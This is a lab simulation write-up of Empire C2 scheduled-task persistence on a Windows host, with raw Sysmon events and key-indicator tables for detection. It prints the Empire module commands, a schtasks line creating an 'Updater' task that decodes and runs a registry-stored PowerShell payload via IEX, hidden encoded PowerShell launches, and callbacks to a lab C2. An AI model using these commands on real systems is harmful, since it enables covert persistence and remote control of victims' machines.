# Persistence Scheduled Task

## Goal 
| Simulation # | Stager Option                           |
| ------------ | --------------------------------------- |
| 1            | usermodule persistence/userland/schtask |

## Technical Context
### Assumption
* Attacker is a low-priv user 
* The C2 connection has established 
  
### Simulation 1
This attack modify the schedule task to main the persistence in a low-priv environment. And the low-priv user simulate the reboot.

#### Payload Generation
```bash
(Empire: agents) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------

 WMXUN8D2 ps 192.168.254.47  WIN-40TITGP9BI7   WIN-40TITGP9BI7\victim  powershell         920    1/0.0    2020-12-04 22:47:38  http

(Empire: WMXUN8D2) > usemodule persistence/userland/schtasks
(Empire: powershell/persistence/userland/schtasks) > set IdleTime 1
(Empire: powershell/persistence/userland/schtasks) > set Listener http
(Empire: powershell/persistence/userland/schtasks) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked WMXUN8D2 to run TASK_CMD_WAIT
[*] Agent WMXUN8D2 tasked with task ID 1
[*] Tasked agent WMXUN8D2 to run module powershell/persistence/userland/schtasks
(Empire: powershell/persistence/userland/schtasks) > 
SUCCESS: The scheduled task "Updater" has successfully been created.
Schtasks persistence established using listener http stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Updater idle trigger on 1.
```

#### Attack Begin

1. Execute the persistence module on empire

##### Raw Sysmon Event


```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T15:19:36.388822900Z'/><EventRecordID>25212</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1936'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-04 15:19:36.386</Data><Data Name='ProcessGuid'>{84453EAB-5388-5FCA-D8DA-0A0000000000}</Data><Data Name='ProcessId'>3492</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>6.1.7600.16385 (win7_rtm.090713-1255)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -Win Hidden -enc //5120bytes long payload//</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='LogonGuid'>{84453EAB-5384-5FCA-8C47-0A0000000000}</Data><Data Name='LogonId'>0xa478c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683</Data><Data Name='ParentProcessGuid'>{84453EAB-5386-5FCA-95AE-0A0000000000}</Data><Data Name='ParentProcessId'>3228</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"</Data></EventData></Event>
```

##### Key Indicator

| Field        | Value                                                                                          | Comments |
| ------------ | ---------------------------------------------------------------------------------------------- | -------- |
| EventID      | 1                                                                                              |          |
| process_exec | powershell.exe                                                                                    |          |
| process_id   | 3492                                                                                           |          |
| parent_process_id   | 3228                                                                                           |  the explorer.exe when OS boot up |
| cmdline      | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -Win Hidden -enc //5120bytes long payload//|          |


C2 Callback
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-04T15:19:41.115550900Z'/><EventRecordID>25217</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1952'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-04 15:19:39.108</Data><Data Name='ProcessGuid'>{84453EAB-5388-5FCA-D8DA-0A0000000000}</Data><Data Name='ProcessId'>3492</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.254.47</Data><Data Name='SourceHostname'>WIN-40TITGP9BI7</Data><Data Name='SourcePort'>49167</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.254.46</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>80</Data><Data Name='DestinationPortName'>http</Data></EventData></Event>
```

##### Key Indicator

| Field             | Value                                                                         | Comments |
| ----------------- | ----------------------------------------------------------------------------- | -------- |
| EventID           | 3                                                                             |          |
| process_exec      | powershell.exe                                                                |          |
| process_id   | 3492                                                                                           |          |
| dest_ip           | 192.168.254.46 | my test lab c2                                                     |
| dest_port         | 80             | depends on the empire listener type, in this simulation i set http |

User execute the payload 

```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-07T13:55:58.443741200Z'/><EventRecordID>55965</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1936'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-07 13:55:58.443</Data><Data Name='ProcessGuid'>{84453EAB-346E-5FCE-0E91-A50400000000}</Data><Data Name='ProcessId'>3620</Data><Data Name='Image'>C:\Windows\System32\schtasks.exe</Data><Data Name='FileVersion'>6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data><Data Name='Description'>Manages scheduled tasks</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sctasks.exe</Data><Data Name='CommandLine'>"C:\Windows\system32\schtasks.exe"  /Create /F /SC ONIDLE /I 1 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='LogonGuid'>{84453EAB-5384-5FCA-8C47-0A0000000000}</Data><Data Name='LogonId'>0xa478c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=97E0EC3D6D99E8CC2B17EF2D3760E8FC,SHA256=6DCE7D58EBB0D705FCB4179349C441B45E160C94E43934C5ED8FA1964E2CD031,IMPHASH=6B4559CA4C2EC47B1D1D5FB43FFA83AD</Data><Data Name='ParentProcessGuid'>{84453EAB-5388-5FCA-D8DA-0A0000000000}</Data><Data Name='ParentProcessId'>3492</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -Win Hidden -enc //5120 bytes payload//</Data></EventData></Event>
```


##### Key Indicator

| Field             | Value          | Comments |
| ----------------- | -------------- | -------- |
| EventID           | 1              |          |
| process_exec      | schtasks.exe |          |
| process_id        | 3620           |          |
| parent_process_id | 3492            |          |
| cmdline           |  "C:\Windows\system32\schtasks.exe" /Create /F /SC ONIDLE /I 1 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""              |          |

```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-07T13:55:58.459341700Z'/><EventRecordID>55966</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1936'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1053</Data><Data Name='UtcTime'>2020-12-07 13:55:58.459</Data><Data Name='ProcessGuid'>{84453EAB-5333-5FCA-CF3E-010000000000}</Data><Data Name='ProcessId'>848</Data><Data Name='Image'>C:\Windows\system32\svchost.exe</Data><Data Name='TargetFilename'>C:\Windows\System32\Tasks\Updater</Data><Data Name='CreationUtcTime'>2020-12-07 13:55:58.459</Data></EventData></Event>
```

##### Key Indicator

| Field        | Value                             | Comments |
| ------------ | --------------------------------- | -------- |
| EventID      | 11                                |          |
| process_exec | svchost.exe                       |          |
| process_id   | 848                               |          |
| file_path    | C:\Windows\System32\Tasks\Updater |          |
| file_name    | Updater                           |          |

Constantly C2 callback - Loop


```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-07T14:36:46.382531300Z'/><EventRecordID>56262</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1936'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-07 14:36:46.382</Data><Data Name='ProcessGuid'>{84453EAB-3DFE-5FCE-5345-B10400000000}</Data><Data Name='ProcessId'>2684</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>6.1.7600.16385 (win7_rtm.090713-1255)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='LogonGuid'>{84453EAB-5384-5FCA-8C47-0A0000000000}</Data><Data Name='LogonId'>0xa478c</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683</Data><Data Name='ParentProcessGuid'>{84453EAB-3DFE-5FCE-9943-B10400000000}</Data><Data Name='ParentProcessId'>3116</Data><Data Name='ParentImage'>C:\Windows\System32\taskeng.exe</Data><Data Name='ParentCommandLine'>taskeng.exe {933E83A7-CB3C-4BED-A0EB-4211B4C602A6} S-1-5-21-2892772840-4280103526-640991184-1003:WIN-40TITGP9BI7\victim:Interactive:[2]</Data></EventData></Event>
```


##### Key Indicator

| Field        | Value                             | Comments |
| ------------ | --------------------------------- | -------- |
| EventID      | 1                               |          |
| process_exec | powershell.exe                       |          |
| process_id   | 2684                               |          |
| parent_process_id| 3116||
| parent_process | taskeng.exe {933E83A7-CB3C-4BED-A0EB-4211B4C602A6} S-1-5-21-2892772840-4280103526-640991184-1003:WIN-40TITGP9BI7\victim:Interactive:[2]||
| cmdline    | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))" |          |

C2 Connection Established
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-12-07T14:36:51.015688400Z'/><EventRecordID>56263</EventRecordID><Correlation/><Execution ProcessID='1568' ThreadID='1952'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-40TITGP9BI7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-12-07 14:36:49.425</Data><Data Name='ProcessGuid'>{84453EAB-3DFE-5FCE-5345-B10400000000}</Data><Data Name='ProcessId'>2684</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WIN-40TITGP9BI7\victim</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.254.47</Data><Data Name='SourceHostname'>WIN-40TITGP9BI7</Data><Data Name='SourcePort'>53619</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.254.46</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>80</Data><Data Name='DestinationPortName'>http</Data></EventData></Event>
```


##### Key Indicator

| Field             | Value                                                                         | Comments |
| ----------------- | ----------------------------------------------------------------------------- | -------- |
| EventID           | 3                                                                             |          |
| process_exec      | powershell.exe                                                                |          |
| process_id   | 2684                                                                                           |          |
| dest_ip           | 192.168.254.46 | my test lab c2                                                     |
| dest_port         | 80             | depends on the empire listener type, in this simulation i set http |
